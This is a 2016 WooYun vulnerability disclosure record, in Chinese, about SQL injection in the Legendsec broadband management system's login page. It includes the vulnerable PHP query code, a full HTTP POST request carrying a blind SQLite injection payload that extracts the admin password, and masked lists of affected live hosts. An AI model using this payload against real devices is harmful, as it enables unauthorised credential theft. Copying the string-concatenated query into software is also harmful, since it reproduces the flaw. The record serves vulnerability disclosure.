{"id": 88664, "wybug_id": "wooyun-2016-0195527", "wybug_title": "网神宽带管理系统(SQLite注入)                                      ", "wybug_corp": "网神信息技术(北京)股份有限公司", "wybug_author": "Angle_G", "wybug_date": "2016-04-12 17:25", "wybug_open_date": "2016-07-14 21:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-18：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-06-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-07-14：\t细节向公众公开  简要描述： RT， 先前大牛审计过的的：http://www.wooyun.org/bugs/wooyun-2015-0165284 详细说明：  大牛审计过的的：http://**.**.**.**/bugs/wooyun-2015-0165284下了网神的 网神宽带管理系统 源码，审计一下！基本没什么洞！授权做的都可以！！意外发现登录处！！！既然用的是\" 双引号闭合的！！！代码：在文件 /login.php\nif ($_REQUEST['action'] == 'login') {\t$userName = iconv(\"UTF-8\", \"gbk\", $_POST['userName']);\t$password = iconv(\"UTF-8\", \"gbk\", $_POST['password']);\t\tif (!$userName || !$password) {\t\techo '{success:false,msg:\"用户名或密码不能为空。\"}';\t\treturn;\t}\t$DB = new SQLite('/usr/hls/etc/passwd.db');\t$result = $DB->Query('select * from passwd where username=\"'.$userName.'\"');\tforeach($result as $r) {\t\tif (!ip_allow($userName, $remote_addr)) {\t\t\techo '{success:false,msg:\"该用户不允许从此IP登录。\"}';\t\t\treturn;\t\t}\t\t\tif (!failure_allow($userName)) {\t\t\techo '{success:false,msg:\"该用户由于连续错误登录次数过多被锁定，请稍后再试。\"}';\t\t\treturn;\t\t}\t\tif ($r['password'] == md5($password) || $r['password'] == $password) {\t\t\tfailure_clear($userName);\t\t} else {\t\t\tfailure_record($userName, $remote_addr);\t\t\techo '{success:false,msg:\"密码错误，请重新输入。\"}';\t\t\treturn;\t\t}\n这两句：\n$DB = new SQLite('/usr/hls/etc/passwd.db');\t$result = $DB->Query('select * from passwd where username=\"'.$userName.'\"');\nSQLite数据库！！！！ 双引号闭合，所以这里是双引号注入！！！！得手工，sqlmap是跑不出来的！！（不然还能有，早被提交了！）直接爆了：\nPOST /login.php?action=login HTTP/1.1Host: **.**.**.**Connection: keep-aliveContent-Length: 82Origin: https://**.**.**.**X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Accept: */*Referer: https://**.**.**.**/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: PHPSESSID=7d8h8ht0dvicelotlhfu7emtv4userName=1\" or substr((select password from passwd),1,1)<1 or \"1\"=\"2&password=1111\n上面语句是的得到管理密码的 第一位！！！证明：第一位截图：\n\n第二位：\n\n案例：\nhttps://**.**.**.**/**.**.**.**:8090/**.**.**.**:4443/**.**.**.**/**.**.**.**:1234/\n   漏洞证明：  如上！   修复方案：  开启gpc   版权声明：转载请注明来源 Angle_G@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2016-04-15 21:01 厂商回复： 感谢白帽子提交的问题。经确认，该情况与2015年12月提出的问题一致，网神已完成了相关问题解决，并提供了相关的更新程序，但考虑到用户的环境和设备数量因素，本次问题属于设备尚未更新所造成。网神会立即通知并跟进相关用户的设备进行更新。！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-04-12 18:20 |    \t\t小牛牛 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:17        | 求带)\t\t \n  前排    \n     2016-04-16 11:17 |    \t\t伤剑 \t\t\t( 普通白帽子  |\t\t\t        Rank:246 漏洞数:102        | extrac)\t\t \n  前排    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}